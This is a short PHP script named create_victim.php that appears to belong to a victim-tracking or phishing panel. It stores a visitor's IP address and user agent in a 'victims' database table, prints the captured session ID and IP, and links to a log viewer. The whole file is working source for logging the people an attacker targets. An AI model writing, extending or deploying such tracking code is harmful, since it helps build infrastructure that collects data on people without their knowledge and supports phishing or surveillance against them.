<?php
// create_victim.php - Force create a victim
include 'database.php';

session_start();

// Create new session
$session_id = md5(uniqid() . time() . rand(1000, 9999));
$_SESSION['session_id'] = $session_id;

// Insert victim
$ip = $_SERVER['REMOTE_ADDR'];
$ua = $_SERVER['HTTP_USER_AGENT'];

$stmt = $conn->prepare("INSERT INTO victims (session_id, ip_address, user_agent, device_info, last_active) VALUES (?, ?, ?, ?, NOW())");
$stmt->bind_param("ssss", $session_id, $ip, $ua, $ua);
$stmt->execute();

echo "<h2 style='color:green;'>✅ VICTIM CREATED SUCCESSFULLY!</h2>";
echo "<p>Session ID: " . $session_id . "</p>";
echo "<p>IP: " . $ip . "</p>";
echo "<p>Time: " . date('Y-m-d H:i:s') . "</p>";
echo "<br><a href='view_logs.php' style='background:#4CAF50; color:white; padding:10px 20px; text-decoration:none;'>View Logs</a>";
echo "&nbsp;&nbsp;&nbsp;";
echo "<a href='index.php' style='background:#2196F3; color:white; padding:10px 20px; text-decoration:none;'>Test Page</a>";
?>